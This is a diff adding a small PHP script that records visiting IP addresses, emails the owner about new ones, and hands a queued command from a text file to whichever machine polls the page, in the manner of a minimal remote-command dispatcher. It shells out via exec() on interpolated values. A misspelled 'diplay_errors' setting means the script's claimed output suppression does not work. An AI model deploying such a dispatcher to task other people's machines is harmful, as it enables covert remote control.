@@ -1,0 +1,26 @@
+<?php
+ini_set("diplay_errors", 0); // make sure there is no unexpected output while in production mode
+$theIP = $_SERVER['REMOTE_ADDR'];
+$ips = "ips.txt"; // a file writable by the web server containing a list of IP addresses that have visited this page
+$command_file = "command.txt"; // a file writable by the web server that will contain a command to execute on the server
+$list = file($ips);
+$command = file($command_file);
+
+foreach ($list as $key => $ip) {
+        $list[$key] = trim($ip);
+}
+$command = trim($command[0]);
+
+if (!empty($command)) {
+        exec("echo > $command_file");
+        echo $command;
+        mail("you@somesite.com", "Command succeeded", "The command \"{$command}\" has been run on {$theIP} -> " . gethostbyaddr($theIP), "From: me@mycomputer.com");
+}
+
+if ( !in_array($theIP, $list) ) {
+	array_push($list, $theIP);
+mail("you@somesite.com", "New IP Address", "{$theIP} -> " . gethostbyaddr($theIP), "From: me@mycomputer.com");
+	exec("echo '{$theIP}' >> {$ips}");
+}
+?>
+
